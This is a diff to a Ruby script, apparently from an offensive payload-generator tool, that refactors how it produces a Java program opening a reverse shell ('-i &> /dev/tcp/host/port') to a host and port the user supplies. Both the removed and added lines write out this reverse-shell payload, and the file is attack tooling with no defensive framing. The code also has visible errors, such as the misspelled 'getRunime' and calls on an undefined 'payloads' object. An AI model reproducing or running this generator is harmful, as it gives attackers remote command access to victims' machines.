@@ -1,15 +1,9 @@
 #!/usr/bin/env ruby
 
-i = "\033[1;77m[i] \033[0m"
-e = "\033[1;31m[-] \033[0m"
-p = "\033[1;77m[>] \033[0m"
-g = "\033[1;34m[*] \033[0m"
-s = "\033[1;32m[+] \033[0m"
-h = "\033[1;77m[@] \033[0m"
-r = "\033[1;77m[#] \033[0m"
-
 require 'optparse'
 require 'ostruct'
+
+require 'core/payloads'
 
 Signal.trap("INT") {
     abort()
@@ -50,87 +44,16 @@ if not host or not port or not shell or not file
     puts "  --output-path=<output_path>    Output path."
     abort()
 end
+
+payload = ""
+payload += "import java.io.IOException;\n"
+payload += "public class Payload {\n"
+payload += "\tpublic static void main(String[] args) {\n"
+payload += "\t\tProcess proc = Runtime.getRunime().exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");\n"
+payload += "\t\tproc.waitFor();\n"
+payload += "\t\tproc.destroy();\n"
+payload += "\t}\n"
+payload += "}\n"
   
-if File.directory? file
-    if File.exists? file
-        if file[-1] == "/"
-            file = "#{file}payload.java"
-            sleep(0.5)
-            puts "#{g}Creating payload..."
-            sleep(1)
-            puts "#{g}Saving to #{file}..."
-            sleep(0.5)
-            open(file, 'w') { |f|
-        	f.puts "import java.io.IOException;"
-        	f.puts "public class Payload"
-        	f.puts "{"
-		f.puts "    public static void main(String[] args)"
-		f.puts "    {"
-		f.puts "        Process proc = Runtime.getRunime().exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
-		f.puts "        proc.waitFor();"
-		f.puts "        proc.destroy();"
-		f.puts "    }"
-        	f.puts "}"
-    	    }
-            puts "#{s}Saved to #{file}!"
-        else
-            file = "#{file}/payload.java"
-            sleep(0.5)
-            puts "#{g}Creating payload..."
-            sleep(1)
-            puts "#{g}Saving to #{file}..."
-            sleep(0.5)
-            open(file, 'w') { |f|
-        	f.puts "import java.io.IOException;"
-        	f.puts "public class Payload"
-        	f.puts "{"
-		f.puts "    public static void main(String[] args)"
-		f.puts "    {"
-		f.puts "        Process proc = Runtime.getRunime().exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
-		f.puts "        proc.waitFor();"
-		f.puts "        proc.destroy();"
-		f.puts "    }"
-        	f.puts "}"
-    	    }
-            puts "#{s}Saved to #{file}!"
-        end
-    else
-        puts "#{e}Output directory: #{file}: does not exist!"
-        abort()
-    end
-else
-    direct = File.dirname(file)
-    if direct == ""
-        direct = "."
-    else
-        nil
-    end
-    if File.exists? direct
-        if File.directory? direct
-            sleep(0.5)
-            puts "#{g}Creating payload..."
-            sleep(1)
-            puts "#{g}Saving to #{file}..."
-            sleep(0.5)
-            open(file, 'w') { |f|
-        	f.puts "import java.io.IOException;"
-        	f.puts "public class Payload"
-        	f.puts "{"
-		f.puts "    public static void main(String[] args)"
-		f.puts "    {"
-		f.puts "        Process proc = Runtime.getRunime().exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
-		f.puts "        proc.waitFor();"
-		f.puts "        proc.destroy();"
-		f.puts "    }"
-        	f.puts "}"
-    	    }
-            puts "#{s}Saved to #{file}!"
-        else
-            puts "#{e}Error: #{direct}: not a directory!"
-            abort()
-        end
-    else
-        puts "#{e}Output directory: #{direct}: does not exist!"
-        abort()
-    end
-end
+payload_handler = payloads.new
+payloads.generate_payload(file, payload)
